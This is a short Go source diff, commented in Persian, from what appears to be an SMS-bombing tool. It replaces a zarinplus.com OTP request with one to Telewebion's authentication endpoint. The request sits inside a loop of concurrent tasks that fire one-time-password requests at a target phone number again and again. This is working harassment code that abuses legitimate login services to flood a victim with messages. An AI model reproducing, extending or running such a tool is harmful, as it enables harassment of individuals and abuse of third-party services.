@@ -683,24 +683,23 @@ cookieJar, _ := cookiejar.New(nil)
 	}
 
 	for i := 0; i < repeatCount; i++ {
-		
 
-
-
-
-
-		// 1. سرویس zarinplus.com (JSON)
-		wg.Add(1)
+	// --- اضافه کردن سرویس Telewebion ---
+		wg.Add(1) // برای هر درخواست جدید باید Add(1) رو صدا بزنید
 		tasks <- func(c *http.Client) func() {
 			return func() {
-				sendJSONRequest(c, ctx, "https://api.zarinplus.com/user/otp/", map[string]interface{}{
-					"phone_number": getPhoneNumber98NoZero(phone), // نیاز به کد 98 دارد
-					"source": "zarinplus",
-				}, &wg, ch)
+				// ساختار JSON مورد نیاز سرویس Telewebion
+				payload := map[string]interface{}{
+					"code":      "98",
+					"phone":     getPhoneNumberNoZero(phone), // شماره بدون صفر اول
+					"smsStatus": "default",
+				}
+				sendJSONRequest(c, ctx, "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one", payload, &wg, ch)
 			}
 		}(client)
+		// --- پایان اضافه کردن سرویس Telewebion ---
 
-
+	}
 	}
 
 	close(tasks)
